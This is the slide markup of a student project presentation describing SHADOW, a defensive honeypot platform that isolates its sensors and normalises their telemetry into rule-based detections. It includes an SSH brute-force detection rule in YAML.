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566928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5E6E7B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>PARUL INSTITUTE OF ENGINEERING AND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spc="200">
                <a:solidFill>
                  <a:srgbClr val="5E6E7B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>PROJECT-II  ·  203105400  ·  SEMESTER 7  ·  2026-27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spc="60">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>SHADOW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44368"/>
            <a:ext cx="1280160" cy="41148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163824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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>A honeypot-driven platform for threat detection, investigation and IOC enrichment, running on a single machine.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224528"/>
            <a:ext cx="1280160" cy="329184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245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8B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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56816" y="4224528"/>
            <a:ext cx="1280160" cy="329184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6816" y="42245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8B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>detect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4224528"/>
            <a:ext cx="1280160" cy="329184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42245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8B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>investigate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6592" y="4224528"/>
            <a:ext cx="1280160" cy="329184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2245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8FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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084064"/>
            <a:ext cx="6035040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24865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5E6E7B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>SUBMITTED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8640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DF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Ayush Kumar Singh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55046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2303031550006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548640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DF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Hetvi Patel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55046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2303031550027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5216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DF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Nandini Upadhye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6" y="5870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2303031550054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585216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6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Malav Shah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5870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2303031550020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72784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Tahoma"/>
              </a:rPr>
              <a:t>Guide: Dr. E. Kanniappan   ·   HOD: Prof. Ankita Gandhi   ·   Group PUCSE_2026_17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1188720"/>
            <a:ext cx="4398264" cy="4718304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1188720"/>
            <a:ext cx="32004" cy="47183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6" y="14264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00">
                <a:solidFill>
                  <a:srgbClr val="35C0E8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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34656" y="1847088"/>
            <a:ext cx="3767328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4656" y="1847088"/>
            <a:ext cx="27432" cy="40233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1847088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cowrie · dionaea · honeytrap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2267712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honeypot sensors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34656" y="2505456"/>
            <a:ext cx="3767328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34656" y="2505456"/>
            <a:ext cx="27432" cy="402336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2505456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collector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2926080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normalise and deduplicate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34656" y="3163824"/>
            <a:ext cx="3767328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34656" y="3163824"/>
            <a:ext cx="27432" cy="402336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99248" y="3163824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detection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3584448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rules, reason, confidence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34656" y="3822191"/>
            <a:ext cx="3767328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34656" y="3822191"/>
            <a:ext cx="27432" cy="402336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9248" y="3822191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correlation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4242816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incidents and risk score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34656" y="4480560"/>
            <a:ext cx="3767328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34656" y="4480560"/>
            <a:ext cx="27432" cy="402336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9248" y="4480560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investigation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656" y="4901184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timeline, evidence, IOCs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34656" y="5138927"/>
            <a:ext cx="3767328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34656" y="5138927"/>
            <a:ext cx="27432" cy="40233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99248" y="5138927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reporting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4656" y="5559551"/>
            <a:ext cx="3767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PDF with provenance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 animBg="1"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47" grpId="0" animBg="1"/>
      <p:bldP spid="48" grpId="0" animBg="1"/>
      <p:bldP spid="49" grpId="0"/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0" animBg="1"/>
      <p:bldP spid="52" grpId="0" animBg="1"/>
      <p:bldP spid="53" grpId="0"/>
      <p:bldP spid="54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Four gaps that a learning-scale security operations setup runs into.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810512"/>
            <a:ext cx="5358384" cy="17922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7" y="2084831"/>
            <a:ext cx="530352" cy="53035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eye-off_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3" y="2212848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36192" y="2121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Tahoma"/>
              </a:rPr>
              <a:t>No access to real attack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2523744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Teaching labs replay recorded traffic. The behaviour that matters, the scanning, the password guessing, the first command typed after a successful login, is never seen live.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810512"/>
            <a:ext cx="5358384" cy="17922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59" y="2084831"/>
            <a:ext cx="530352" cy="53035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alert__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5" y="2212848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32904" y="2121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Tahoma"/>
              </a:rPr>
              <a:t>Alerts arrive without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2904" y="2523744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A tool reports a severity and stops. Why the rule fired, what else the same source touched, and which stage of the attack it belongs to are left for the analyst to work out.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785616"/>
            <a:ext cx="5358384" cy="17922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7" y="4059936"/>
            <a:ext cx="530352" cy="53035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lock__a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3" y="4187952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36192" y="40965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Tahoma"/>
              </a:rPr>
              <a:t>Commercial tooling is out of reach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36192" y="4498848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SIEM licensing, sandbox subscriptions and threat intelligence feeds put a complete detection pipeline beyond the budget of a college project.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3785616"/>
            <a:ext cx="5358384" cy="17922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37959" y="4059936"/>
            <a:ext cx="530352" cy="53035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6" name="Picture 45" descr="clipboard__a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5" y="4187952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232904" y="409651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Tahoma"/>
              </a:rPr>
              <a:t>Control evidence is gathered by hand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4498848"/>
            <a:ext cx="41148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Compliance evidence is screenshotted into spreadsheets once a year, so it is out of date the day it is filed and cannot be traced back to a source.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85216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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>The common cause: there is no safe place to watch a real attack from start to finish.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 animBg="1"/>
      <p:bldP spid="31" grpId="0"/>
      <p:bldP spid="32" grpId="0"/>
      <p:bldP spid="33" grpId="0"/>
      <p:bldP spid="34" grpId="0" animBg="1"/>
      <p:bldP spid="35" grpId="0" animBg="1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4" grpId="0" animBg="1"/>
      <p:bldP spid="45" grpId="0" animBg="1"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47" grpId="0"/>
      <p:bldP spid="48" grpId="0"/>
      <p:bldP spid="49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Objectives and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00784"/>
            <a:ext cx="5358384" cy="1335024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1700784"/>
            <a:ext cx="32004" cy="13350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1847088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PROBLEM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2084832"/>
            <a:ext cx="4882896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Design and implement a honeynet-driven platform that captures real attacker telemetry, converts it into explainable detections and incidents, and produces audit-grade evidence, without cloud services or paid tooling.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255264"/>
            <a:ext cx="5358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00">
                <a:solidFill>
                  <a:srgbClr val="8B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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1" y="3575304"/>
            <a:ext cx="91440" cy="914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5295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Included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8256" y="3520440"/>
            <a:ext cx="38587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AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>deception, detection, correlation, investigation, reporting, compliance readiness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1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1" y="4288536"/>
            <a:ext cx="91440" cy="9144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2428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Excluded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8256" y="4233672"/>
            <a:ext cx="38587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AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>named threat-actor attribution, offensive tooling, production-scale throughput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809744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1" y="5001768"/>
            <a:ext cx="91440" cy="91440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9560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Ground rule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48256" y="4946904"/>
            <a:ext cx="38587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AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>a capability that is not configured reports that it is not configured, and never produces a simulated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1700784"/>
            <a:ext cx="5358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200">
                <a:solidFill>
                  <a:srgbClr val="8B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>OBJECTIVES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47688" y="202082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Tahoma"/>
              </a:rPr>
              <a:t>Capture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7688" y="2267712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Run real honeypot sensors on an isolated network and ingest everything they observe.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274320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274320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7688" y="2752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Tahoma"/>
              </a:rPr>
              <a:t>Normalise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2999232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Reduce three sensor formats to one schema, deduplicated by content.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47472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34747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47688" y="348386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Tahoma"/>
              </a:rPr>
              <a:t>Detect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7688" y="3730752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Evaluate declarative rules over that stream and raise detections that carry their own reasoning.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420624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42062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47688" y="421538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Tahoma"/>
              </a:rPr>
              <a:t>Correlate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47688" y="4462272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Group related detections into incidents with a computed risk score and a reconstructed timeline.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493776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49377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47688" y="494690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Tahoma"/>
              </a:rPr>
              <a:t>Enrich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5193792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Extract IOCs, map activity to MITRE ATT&amp;CK and profile attacker behaviour from measured signals.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56692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56692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567842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Tahoma"/>
              </a:rPr>
              <a:t>Prove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47688" y="5925312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Preserve evidence under chain of custody and generate reports whose figures trace to a query.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 animBg="1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Existing work and the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Twenty-two papers were surveyed across three areas.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810512"/>
            <a:ext cx="3538728" cy="312724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810512"/>
            <a:ext cx="32004" cy="3127248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20116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F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>DECEPTION RESEARCH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1822" y="245287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237744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High-interaction honeypots capture rich attacker sessions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822" y="309295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" y="30175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Deployment and containment patterns are well established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822" y="373303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365760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Published datasets are released as raw logs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7" y="4315968"/>
            <a:ext cx="3017520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48056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7B"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Work stops at capture. The analysis layer is left to the reader.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5112" y="1810512"/>
            <a:ext cx="3538728" cy="312724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5112" y="1810512"/>
            <a:ext cx="32004" cy="31272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20116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D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>DETECTION ENGINEERING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0006" y="245287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18888" y="237744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Sigma gave detection rules a portable grammar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20006" y="309295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18888" y="30175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MITRE ATT&amp;CK gave findings a shared vocabulary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0006" y="373303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18888" y="365760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Coverage is measured per rule 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9432" y="4315968"/>
            <a:ext cx="3017520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9432" y="448056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7B"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>A SIEM is assumed to already hold the data. The pipeline is out of frame.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3296" y="1810512"/>
            <a:ext cx="3538728" cy="312724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83296" y="1810512"/>
            <a:ext cx="32004" cy="312724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6" y="20116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58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>SOC AUTOMATION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78190" y="245287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237744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Correlation and triage reduce analyst workload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78190" y="309295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301752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Machine learning is applied to alert prioritisation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78190" y="3733038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77072" y="3657600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Explainability is named as an open problem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57616" y="4315968"/>
            <a:ext cx="3017520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57616" y="448056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E6E7B"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Evaluated on enterprise telemetry that is not available outside the enterprise.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138928"/>
            <a:ext cx="11055096" cy="969264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6928" y="5138928"/>
            <a:ext cx="32004" cy="96926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285232"/>
            <a:ext cx="10597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THE GAP THIS PROJECT ADDRESSES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" y="5522976"/>
            <a:ext cx="105796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No open, single-machine system carries one event from a live honeypot all the way to a graded incident, an ATT&amp;CK mapping, a chain-of-custody record and a scored compliance control, with the reasoning preserved at every step.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 animBg="1"/>
      <p:bldP spid="64" grpId="0"/>
      <p:bldP spid="65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Twelve containers by default across four Docker networks. The edge network and the application network never bridge.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810512"/>
            <a:ext cx="3218688" cy="3602736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5A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810512"/>
            <a:ext cx="32004" cy="360273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01168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85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>honeynet_edge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2128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isolated, no route inward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2560320"/>
            <a:ext cx="2688336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2560320"/>
            <a:ext cx="27432" cy="40233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2560320"/>
            <a:ext cx="24505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cowrie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3090672"/>
            <a:ext cx="2688336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3090672"/>
            <a:ext cx="27432" cy="40233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3090672"/>
            <a:ext cx="24505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dionaea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3621024"/>
            <a:ext cx="2688336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" y="3621024"/>
            <a:ext cx="27432" cy="40233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3621024"/>
            <a:ext cx="245059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honeytrap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242816"/>
            <a:ext cx="2724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Sensors are exposed on purpose. Containment is enforced by the network layout, not by configuration.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77316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FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>telemetry/raw/&lt;sensor&gt;/*.json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9743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read-only mount, the only crossing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58768" y="3268980"/>
            <a:ext cx="512064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 rot="5400000">
            <a:off x="4343400" y="3227832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1810512"/>
            <a:ext cx="3986784" cy="3602736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740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0560" y="1810512"/>
            <a:ext cx="32004" cy="360273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36592" y="201168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FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>honeynet_app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6592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application and data plane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36592" y="2560320"/>
            <a:ext cx="3474720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36592" y="2560320"/>
            <a:ext cx="27432" cy="402336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01184" y="2560320"/>
            <a:ext cx="32369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backend  ·  FastAPI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01184" y="3108960"/>
            <a:ext cx="3310128" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111820">
              <a:alpha val="92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31089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Courier New"/>
              </a:rPr>
              <a:t>collector and normaliser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01184" y="3456432"/>
            <a:ext cx="3310128" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111820">
              <a:alpha val="92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47488" y="3456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Courier New"/>
              </a:rPr>
              <a:t>detection and correlation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01184" y="3803904"/>
            <a:ext cx="3310128" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111820">
              <a:alpha val="92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7488" y="38039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Courier New"/>
              </a:rPr>
              <a:t>session, timeline, evidence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01184" y="4151376"/>
            <a:ext cx="3310128" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111820">
              <a:alpha val="92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47488" y="41513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Courier New"/>
              </a:rPr>
              <a:t>compliance and risk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01184" y="4498848"/>
            <a:ext cx="3310128" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111820">
              <a:alpha val="92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7488" y="4498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Courier New"/>
              </a:rPr>
              <a:t>report generation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36592" y="4937760"/>
            <a:ext cx="1682496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36592" y="4937760"/>
            <a:ext cx="27432" cy="40233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01184" y="4937760"/>
            <a:ext cx="14447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MariaDB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28816" y="4937760"/>
            <a:ext cx="1682496" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111820">
              <a:alpha val="96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28816" y="4937760"/>
            <a:ext cx="27432" cy="40233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93408" y="4937760"/>
            <a:ext cx="144475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SSE stream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41664" y="1810512"/>
            <a:ext cx="2880360" cy="360273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97696" y="201168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SUPPORTING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7696" y="237744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nginx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7696" y="256032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serves the dashboard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97696" y="279806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MobSF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97696" y="2980944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Android analysis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97696" y="321868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ClamAV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97696" y="3401568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signature scanning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97696" y="363931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Guacamole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97696" y="3822192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lab desktop streaming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97696" y="4059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analysis sandbox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97696" y="4242816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network 'analysis', no egress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97696" y="448056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Kali lab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97696" y="466344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network 'labnet'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97696" y="490118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phpMyAdmin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97696" y="5084064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database inspection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5687568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8FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>A compromised sensor cannot reach the backend, and the backend cannot reach the sensors.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99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99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220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220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 animBg="1"/>
      <p:bldP spid="31" grpId="0"/>
      <p:bldP spid="32" grpId="0"/>
      <p:bldP spid="33" grpId="0" animBg="1"/>
      <p:bldP spid="34" grpId="0" animBg="1"/>
      <p:bldP spid="35" grpId="0"/>
      <p:bldP spid="36" grpId="0" animBg="1"/>
      <p:bldP spid="37" grpId="0" animBg="1"/>
      <p:bldP spid="38" grpId="0"/>
      <p:bldP spid="39" grpId="0" animBg="1"/>
      <p:bldP spid="40" grpId="0" animBg="1"/>
      <p:bldP spid="41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/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0" animBg="1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 animBg="1"/>
      <p:bldP spid="66" grpId="0"/>
      <p:bldP spid="67" grpId="0" animBg="1"/>
      <p:bldP spid="68" grpId="0" animBg="1"/>
      <p:bldP spid="69" grpId="0"/>
      <p:bldP spid="70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How data moves through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Six steps. Each one records why it did what it did.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828800"/>
            <a:ext cx="1700784" cy="22494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828800"/>
            <a:ext cx="32004" cy="2249424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8096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F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New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2688336"/>
            <a:ext cx="133502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A sensor logs the connection, the credentials attempted and the commands run.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958084"/>
            <a:ext cx="54864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2313432" y="291693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14016" y="1828800"/>
            <a:ext cx="1700784" cy="22494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14016" y="1828800"/>
            <a:ext cx="32004" cy="2249424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5184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15184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D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New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15184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Ingest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2688336"/>
            <a:ext cx="133502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The collector is woken by the filesystem and reads from a stored cursor.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33087" y="2958084"/>
            <a:ext cx="54864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5400000">
            <a:off x="4160520" y="291693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1104" y="1828800"/>
            <a:ext cx="1700784" cy="22494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61104" y="1828800"/>
            <a:ext cx="32004" cy="2249424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62272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8FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New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2272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Normalise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2272" y="2688336"/>
            <a:ext cx="133502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Three formats become one schema. A content hash becomes the primary key.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0176" y="2958084"/>
            <a:ext cx="54863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6007607" y="291693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08192" y="1828800"/>
            <a:ext cx="1700784" cy="22494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08192" y="1828800"/>
            <a:ext cx="32004" cy="2249424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8FD0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New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Detect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2688336"/>
            <a:ext cx="133502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Rules match within a time window and emit a detection with a stated reason.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27264" y="2958084"/>
            <a:ext cx="54864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7854696" y="291693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55279" y="1828800"/>
            <a:ext cx="1700784" cy="22494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55279" y="1828800"/>
            <a:ext cx="32004" cy="22494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56448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56448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56448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Correlate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56448" y="2688336"/>
            <a:ext cx="133502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Detections from one source are grouped into an incident and a session.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74351" y="2958084"/>
            <a:ext cx="54864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Isosceles Triangle 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="9701784" y="291693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02367" y="1828800"/>
            <a:ext cx="1700784" cy="22494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02367" y="1828800"/>
            <a:ext cx="32004" cy="224942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03536" y="2011680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03536" y="201168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FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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03536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Explain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03536" y="2688336"/>
            <a:ext cx="133502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Risk is broken into components and the timeline reconstructs the attack.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4334256"/>
            <a:ext cx="5358384" cy="1463040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4334256"/>
            <a:ext cx="32004" cy="14630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4672" y="4480560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WHY NO EVENT IS LOST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2" y="4718304"/>
            <a:ext cx="488289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Cursors are committed in the same transaction as the events. If the process stops mid-cycle the transaction rolls back, the same bytes are read again, and the content-hash primary key absorbs the repeat. Committing cursors separately would risk the opposite failure: moving past events that were never stored.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4334256"/>
            <a:ext cx="5358384" cy="1463040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63640" y="4334256"/>
            <a:ext cx="32004" cy="14630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01383" y="4480560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FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>WHY IT CAN BE REPLAYED SAFELY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01383" y="4718304"/>
            <a:ext cx="488289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Because identity is the content hash and the cursor is transactional, running the same telemetry through the pipeline twice produces no duplicate events, no duplicate detections and no duplicate incidents. A demonstration can therefore be replayed on demand and still be correct.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 animBg="1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 animBg="1"/>
      <p:bldP spid="60" grpId="0" animBg="1"/>
      <p:bldP spid="61" grpId="0" animBg="1"/>
      <p:bldP spid="62" grpId="0" animBg="1"/>
      <p:bldP spid="63" grpId="0"/>
      <p:bldP spid="64" grpId="0"/>
      <p:bldP spid="65" grpId="0"/>
      <p:bldP spid="66" grpId="0"/>
      <p:bldP spid="67" grpId="0" animBg="1"/>
      <p:bldP spid="68" grpId="0" animBg="1"/>
      <p:bldP spid="69" grpId="0" animBg="1"/>
      <p:bldP spid="70" grpId="0" animBg="1"/>
      <p:bldP spid="71" grpId="0"/>
      <p:bldP spid="72" grpId="0"/>
      <p:bldP spid="73" grpId="0"/>
      <p:bldP spid="74" grpId="0"/>
      <p:bldP spid="75" grpId="0" animBg="1"/>
      <p:bldP spid="76" grpId="0" animBg="1"/>
      <p:bldP spid="77" grpId="0"/>
      <p:bldP spid="78" grpId="0"/>
      <p:bldP spid="79" grpId="0" animBg="1"/>
      <p:bldP spid="80" grpId="0" animBg="1"/>
      <p:bldP spid="81" grpId="0"/>
      <p:bldP spid="82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The honeypot sensors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37360"/>
            <a:ext cx="3538728" cy="303580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1737360"/>
            <a:ext cx="32004" cy="3035808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Courier New"/>
              </a:rPr>
              <a:t>cowrie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22677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85149"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>SSH and Telnet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246888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Courier New"/>
              </a:rPr>
              <a:t>ports 22, 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7" y="2779776"/>
            <a:ext cx="2999232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1822" y="3010662"/>
            <a:ext cx="68580" cy="6858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" y="2944368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Emulates a full shell, so the attacker reaches a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822" y="3577590"/>
            <a:ext cx="68580" cy="6858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3511296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Records every credential pair and every command entered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1822" y="4144518"/>
            <a:ext cx="68580" cy="6858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" y="4078224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Saves downloaded files, not only the URLs they came from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5112" y="1737360"/>
            <a:ext cx="3538728" cy="303580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5112" y="1737360"/>
            <a:ext cx="32004" cy="303580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Courier New"/>
              </a:rPr>
              <a:t>dionaea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22677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29922"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>SMB, FTP and MSSQL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9432" y="246888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Courier New"/>
              </a:rPr>
              <a:t>ports 445, 21, 1433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99432" y="2779776"/>
            <a:ext cx="2999232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20006" y="3010662"/>
            <a:ext cx="68580" cy="685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8888" y="2944368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Emulates protocols that malware targets directly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20006" y="3577590"/>
            <a:ext cx="68580" cy="685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18888" y="3511296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Captures dropped binaries for later analysis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0006" y="4144518"/>
            <a:ext cx="68580" cy="685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18888" y="4078224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Catches worm and scanner traffic that SSH never sees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3296" y="1737360"/>
            <a:ext cx="3538728" cy="303580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83296" y="1737360"/>
            <a:ext cx="32004" cy="30358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7616" y="1920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Courier New"/>
              </a:rPr>
              <a:t>honeytrap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7616" y="226771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8A6FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>HTTP and generic TCP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7616" y="246888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Courier New"/>
              </a:rPr>
              <a:t>ports 80, 8080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57616" y="2779776"/>
            <a:ext cx="2999232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78190" y="3010662"/>
            <a:ext cx="68580" cy="685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77072" y="2944368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Low-interaction catch-all for otherwise unclaimed ports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78190" y="3577590"/>
            <a:ext cx="68580" cy="685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2" y="3511296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Records web exploitation and path traversal attempts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78190" y="4144518"/>
            <a:ext cx="68580" cy="685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77072" y="4078224"/>
            <a:ext cx="2761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Widens coverage without widening the attack surface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974336"/>
            <a:ext cx="5358384" cy="1170432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4974336"/>
            <a:ext cx="32004" cy="1170432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2" y="5120640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F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>CONTAINMENT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" y="5358384"/>
            <a:ext cx="488289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The sensors sit on a Docker network with no route to the application network, and their log files cross into the platform as a read-only mount. Nothing an attacker does inside a sensor can reach the rest of the system.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4974336"/>
            <a:ext cx="5358384" cy="1170432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63640" y="4974336"/>
            <a:ext cx="32004" cy="117043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01383" y="5120640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FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>REPRODUCIBILITY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01383" y="5358384"/>
            <a:ext cx="488289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A replay script regenerates equivalent telemetry offline. Detection work and the review demonstration therefore do not depend on somebody choosing to attack the honeypot that afternoon.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 animBg="1"/>
      <p:bldP spid="30" grpId="0"/>
      <p:bldP spid="31" grpId="0"/>
      <p:bldP spid="32" grpId="0"/>
      <p:bldP spid="33" grpId="0" animBg="1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 animBg="1"/>
      <p:bldP spid="42" grpId="0"/>
      <p:bldP spid="43" grpId="0"/>
      <p:bldP spid="44" grpId="0"/>
      <p:bldP spid="45" grpId="0" animBg="1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 animBg="1"/>
      <p:bldP spid="54" grpId="0"/>
      <p:bldP spid="55" grpId="0"/>
      <p:bldP spid="56" grpId="0"/>
      <p:bldP spid="57" grpId="0" animBg="1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 animBg="1"/>
      <p:bldP spid="66" grpId="0"/>
      <p:bldP spid="67" grpId="0"/>
      <p:bldP spid="68" grpId="0" animBg="1"/>
      <p:bldP spid="69" grpId="0" animBg="1"/>
      <p:bldP spid="70" grpId="0"/>
      <p:bldP spid="71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Telemetry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860804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1810512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Woken by the kernel, not polled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057400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The collector is notified the moment a sensor appends to its log. Interval polling is only a fallback where notification is unavailable.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58084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2907791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Byte cursors, not timestamps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154679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Each sensor log carries a stored cursor. A restart resumes from that position, never from the beginning and never from the present moment.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055363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005072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The content hash is the identity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251960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A normalised event is keyed by the hash of its own content, so reading the same bytes again collapses into the existing row instead of duplicating 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152644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102352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Latency is measured, not assumed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349240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Every published batch records the time from the sensor writing the line to the dashboard receiving it, exposed on a status endpoint.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737360"/>
            <a:ext cx="5358384" cy="3017520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59" y="193852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ONE COLLECTOR CYCLE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0820" y="2336291"/>
            <a:ext cx="100584" cy="100584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61403" y="2487168"/>
            <a:ext cx="9144" cy="310896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79" y="226771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tail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0727" y="227685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read each sensor log from its cursor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60820" y="2811779"/>
            <a:ext cx="100584" cy="100584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403" y="2962656"/>
            <a:ext cx="9144" cy="310896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79" y="27432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normalise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7" y="275234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three sensor formats into one schema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0820" y="3287268"/>
            <a:ext cx="100584" cy="10058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61403" y="3438144"/>
            <a:ext cx="9144" cy="310896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79" y="321868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persist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0727" y="32278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write normalised and raw event rows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60820" y="3762756"/>
            <a:ext cx="100584" cy="10058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661403" y="3913632"/>
            <a:ext cx="9144" cy="310896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79" y="36941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publish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0727" y="370332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push to the dashboard event stream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0820" y="4238244"/>
            <a:ext cx="100584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79" y="416966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  <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>save cursors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0727" y="417880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in the same transaction as the events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4919472"/>
            <a:ext cx="5358384" cy="1005840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4919472"/>
            <a:ext cx="32004" cy="10058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01383" y="5065776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ONE SCHEMA, TWO SOURCES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01383" y="5303520"/>
            <a:ext cx="488289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The Amazon S3 ingestion path used in cloud mode shares this same normalisation module, so local and cloud deployments cannot drift apart in how events are shaped.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 animBg="1"/>
      <p:bldP spid="38" grpId="0"/>
      <p:bldP spid="39" grpId="0"/>
      <p:bldP spid="40" grpId="0" animBg="1"/>
      <p:bldP spid="41" grpId="0"/>
      <p:bldP spid="42" grpId="0" animBg="1"/>
      <p:bldP spid="43" grpId="0" animBg="1"/>
      <p:bldP spid="44" grpId="0"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0" animBg="1"/>
      <p:bldP spid="47" grpId="0" animBg="1"/>
      <p:bldP spid="48" grpId="0"/>
      <p:bldP spid="49" grpId="0"/>
      <p:bldP spid="50" grpId="0" animBg="1"/>
      <p:bldP spid="51" grpId="0" animBg="1"/>
      <p:bldP spid="52" grpId="0"/>
      <p:bldP spid="53" grpId="0"/>
      <p:bldP spid="54" grpId="0" animBg="1"/>
      <p:bldP spid="55" grpId="0" animBg="1"/>
      <p:bldP spid="56" grpId="0"/>
      <p:bldP spid="57" grpId="0"/>
      <p:bldP spid="58" grpId="0" animBg="1"/>
      <p:bldP spid="59" grpId="0"/>
      <p:bldP spid="60" grpId="0"/>
      <p:bldP spid="61" grpId="0" animBg="1"/>
      <p:bldP spid="62" grpId="0" animBg="1"/>
      <p:bldP spid="63" grpId="0"/>
      <p:bldP spid="64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The detection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Rules are data files, not code, and each detection records its own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792224"/>
            <a:ext cx="5358384" cy="3255264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792224"/>
            <a:ext cx="32004" cy="325526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197510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D0EA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>backend/detections/st-auth-001.yml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" y="2286000"/>
            <a:ext cx="4754880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243230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id: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st-auth-001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262615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name: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SSH / Telnet brute force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2820009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severity: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301386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confidence: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3207715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type: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threshold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3401568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attack:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New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35954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  technique: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T1110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789273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  tactic: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Credential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98312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selection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New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176979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  authentication_result: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FAILURE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437083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timeframe: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10m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4564684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group_by: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source_ip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4758537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threshold:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t> 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1842516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1792224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Declarative and reviewable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039112"/>
            <a:ext cx="51755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Rules live as YAML under version control and are mounted read-only, so a change is visible in a diff and needs no code deployment.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2811780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2761488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Two matching styles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3008376"/>
            <a:ext cx="51755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Threshold rules count matching events inside a window. Sequence rules look for ordered behaviour. Both group by a chosen field.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767328"/>
            <a:ext cx="5358384" cy="1280160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59" y="393192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RULES IN THE SHIPPED SET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59" y="41879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st-auth-001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088" y="41879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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>brute force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67928" y="418795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T1110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9992" y="41879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st-cred-002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20" y="41879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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>success after brute force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09960" y="418795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T1078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59" y="44439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st-exec-003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62088" y="44439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B9AA7"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
